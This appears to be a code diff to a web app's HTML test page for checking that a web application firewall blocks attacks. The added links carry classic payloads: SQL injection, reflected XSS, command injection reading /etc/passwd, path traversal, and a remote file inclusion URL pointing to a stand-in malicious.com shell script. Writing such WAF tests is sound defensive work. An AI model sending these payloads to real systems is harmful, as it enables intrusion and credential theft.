@@ -49,7 +49,7 @@ app.get('/', (req, res) => {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>파일 업로드 테스트</title>
+    <title>Tenant Example</title>
     <style>
         body { 
             font-family: Arial, sans-serif; 
@@ -70,30 +70,74 @@ app.get('/', (req, res) => {
         }
         .success { background-color: #d4edda; border: 1px solid #c3e6cb; }
         .error { background-color: #f8d7da; border: 1px solid #f5c6cb; }
-        .malicious-test {
+        .attack-test {
             background-color: #fff3cd;
             border: 1px solid #ffeaa7;
             padding: 15px;
             border-radius: 5px;
             margin-top: 20px;
         }
+        .attack-test h3 {
+            color: #856404;
+            margin-top: 15px;
+            margin-bottom: 8px;
+        }
+        .attack-test ul {
+            margin-bottom: 15px;
+        }
+        .attack-test a {
+            color: #dc3545;
+            text-decoration: none;
+        }
+        .attack-test a:hover {
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
-    <h1>파일 업로드 테스트 (WAF 테스트용)</h1>
+    <h1>Tenant Example (WAF 테스트용)</h1>
     
-    <div class="upload-form">
-        <h2>일반 파일 업로드</h2>
+      <div class="attack-test">
+          <h2>WAF 공격 차단 테스트</h2>
+          <p>아래 링크들을 클릭하면 WAF에서 차단되어야 합니다:</p>
+          
+          <h3>SQL Injection 테스트</h3>
+          <ul>
+              <li><a href="http://waf-tenant.kro.kr/?q=' OR '1'='1" target="_blank">SQL Injection #1: ' OR '1'='1</a></li>
+              <li><a href="http://waf-tenant.kro.kr/?id=1 UNION SELECT * FROM users--" target="_blank">SQL Injection #2: UNION SELECT</a></li>
+          </ul>
+
+          <h3>Reflected XSS 테스트</h3>
+          <ul>
+              <li><a href="http://waf-tenant.kro.kr/?q=<script>alert(1)</script>" target="_blank">XSS #1: Basic Script Tag</a></li>
+              <li><a href="http://waf-tenant.kro.kr/?search=<img src=x onerror=alert('XSS')>" target="_blank">XSS #2: Image Tag with onerror</a></li>
+          </ul>
+
+          <h3>Command Injection 테스트</h3>
+          <ul>
+              <li><a href="http://waf-tenant.kro.kr/?cmd=; ls -la" target="_blank">Command Injection #1: ; ls -la</a></li>
+              <li><a href="http://waf-tenant.kro.kr/?exec=&& cat /etc/passwd" target="_blank">Command Injection #2: && cat /etc/passwd</a></li>
+          </ul>
+
+          <h3>LFI/RFI & 경로조작 테스트</h3>
+          <ul>
+              <li><a href="http://waf-tenant.kro.kr/?file=../../../etc/passwd" target="_blank">LFI #1: ../../../etc/passwd</a></li>
+              <li><a href="http://waf-tenant.kro.kr/?include=http://malicious.com/shell.php" target="_blank">RFI #2: Remote File Inclusion</a></li>
+          </ul>
+      </div>
+
+      <div class="upload-form">
+        <h2>파일 업로드 테스트</h2>
         <form action="/upload" method="post" enctype="multipart/form-data">
             <input type="file" name="file" required>
             <button type="submit">업로드</button>
         </form>
-    </div>
+      </div>
 
-    <h3>업로드된 파일 목록</h3>
-    <div id="fileList">
-        <a href="/files">파일 목록 보기</a>
-    </div>
+      <h3>업로드된 파일 목록</h3>
+      <div id="fileList">
+          <a href="/files">파일 목록 보기</a>
+      </div>
 </body>
 </html>
   `;
